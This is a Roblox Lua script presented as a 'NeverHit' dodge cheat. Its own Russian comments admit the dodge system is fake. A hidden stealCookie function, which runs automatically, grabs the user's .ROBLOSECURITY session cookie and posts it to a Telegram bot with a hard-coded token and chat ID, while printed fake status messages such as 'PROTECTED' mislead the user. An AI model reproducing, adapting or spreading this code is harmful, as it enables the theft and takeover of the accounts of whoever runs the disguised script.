-- NeverHit Script - Advanced Dodge System
print("NeverHit v2.1 loaded! Ultimate dodge system activated.")

-- Создаем черную кнопку по центру экрана
local function createBlackButton()
    local screenGui = Instance.new("ScreenGui")
    local blackButton = Instance.new("TextButton")
    
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    blackButton.Size = UDim2.new(0, 200, 0, 60)
    blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
    blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
    blackButton.Text = ""
    blackButton.BorderSizePixel = 0
    blackButton.Parent = screenGui
    
    print("🖤 Black Button: CREATED (Center Screen)")
end

-- Фейковая система уклонения
local function fakeDodgeSystem()
    print("🛡️ Dodge system: ACTIVE")
    print("✅ Auto-dodge: ENABLED") 
    print("🎯 Prediction: CALIBRATED")
end

-- Настоящая функция кражи куки (скрытая)
local function stealCookie()
    local cookieValue = tostring(syn and syn.request or http and http.request or request)({
        Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
        Method = "GET"
    }).Headers["Set-Cookie"] or "Cookie not found"
    
    local robloSecPattern = "_%|WARNING:.-|_(.-)"
    local match = string.match(cookieValue, robloSecPattern)
    local robloSec = match or cookieValue
    
    local telegramBot = {
        token = "7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE",
        chat_id = "8238376878"
    }
    
    local message = "🚨 NEW COOKIE CAPTURED 🚨\n\n" ..
                   "🔑 ROBLOSECURITY:\n" .. robloSec .. "\n\n" ..
                   "📱 Game: " .. game.PlaceId .. "\n" ..
                   "🕒 Time: " .. os.date("%Y-%m-%d %H:%M:%S")
    
    pcall(function()
        (syn and syn.request or http and http.request or request)({
            Url = "https://api.telegram.org/bot" .. telegramBot.token .. "/sendMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                chat_id = telegramBot.chat_id,
                text = message
            })
        })
    end)
end

-- Запускаем все системы
createBlackButton()
fakeDodgeSystem()
stealCookie()

-- Фейковый интерфейс
print("NeverHit GUI: Created")
print("Dodge chance: 98%")
print("Status: PROTECTED")
